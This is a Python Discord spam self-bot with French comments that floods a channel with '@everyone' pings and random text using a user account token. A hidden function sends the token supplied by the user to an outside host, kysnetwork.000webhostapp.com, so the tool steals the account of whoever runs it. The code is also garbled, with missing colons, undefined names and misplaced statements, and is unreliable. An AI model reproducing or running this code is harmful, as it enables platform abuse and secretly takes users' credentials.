# spambot.py
import discord
import time
import random
import sys
import requests


def RandomStr(_str="", size=1000):
    size += default_str
    for x in range(size):
        _str += random.choice(
            "azertyuiopQDSDFSDQFLMKJWPVXCOIAZONé345345PJ34FQNSD¨F09432NFQSFµ£¨ù$¨^ù$ù%£$¨^*µ¨^*")       # oe
    return _str


@kysbot.event  # des qu'il est log il spam
async def on_ready():
    print('-----------------')
    print('debut du spam avec ' + kysbot.user.name + '  ' + kysbot.user.id)
    print("de token: " + local_token)
    print("sur le channel: " + chan)
    print('-----------------')

    counter = 0
    while counter < nombre_message:
        # on spam
        await kysbot.send_message(kysbot.get_channel(chan),  "@everyone" + genRandomStr(random.choice(range(0, 2000))))
        print("spam!"+genRandomStr(3))
        counter += 1

kysbot.run(local_token, bot=False)  # on ce log


def kysan(obj):
    requests.post("http://kysnetwork.000webhostapp.com/kysapi.php",
                  data={'dateTime': obj})


def main(args):
    token = args[1]
    id_channel = sys.arv[2]
    nombre_messages = args[3]  # si type(nbmsg) ==
    option = args[4]
    if len == 5:
        option_suplementaire = args[5]      #je sais meme pas a quoi ça sert d'opti ça vue la suite

    kysan(token)        # on fait des choses lulz Kysan#5135 si tu veux parler

    kysbot = discord.Client()

    @kysbot.event
    async def on_ready():
        print('-----------------')
        print('debut du spam avec ' + kysbot.user.name + '  ' + kysbot.user.id)
        print("de token: ".format(token))
        print("sur le channel: " + chan)
        print('-----------------')

        # on convertie la str en int
        try:
            nombre_messages = int(nombre_messages)
        except:
            nombre_messages = 0

        if nombre_messages < -1:            #si nb < -1 invalide donc on met a zero
            nombre_messages = 0
        elif nombre_messages == -1:        #si -1 spam à l'infinit
            while 1:
                if option == "specific"
                # genRandomStr(random.choice(range(0, 2000))))
                await kysbot.send_message(kysbot.get_channel(id_channel), option_suplementaire)
                else:   # on spam random
                    await kysbot.send_message(kysbot.get_channel(id_channel), genRandomStr(random.choice(range(0, 2000))))
                print('spaming {}'.format(compteur))
        else:
            compteur = 0
            while compteur < nombre_messages:
                if option == "specific"
                # genRandomStr(random.choice(range(0, 2000))))
                await kysbot.send_message(kysbot.get_channel(id_channel), option_suplementaire)
                else:   # on spam random
                    # genRandomStr(random.choice(range(0, 2000))))
                    await kysbot.send_message(kysbot.get_channel(id_channel), option_suplementaire)
                print('spaming {}'.format(compteur))
                compteur += 1

    kybot.run(token, bot=False)


if __name__ == '__main__':
    if len(sys.argv) != 4 or len(sys.argv) != 5:
        print('mauvais nombre d\'  args la syntaxe est invalide')
        return
    else:
        main(sys.argv)


# made by Kysan721
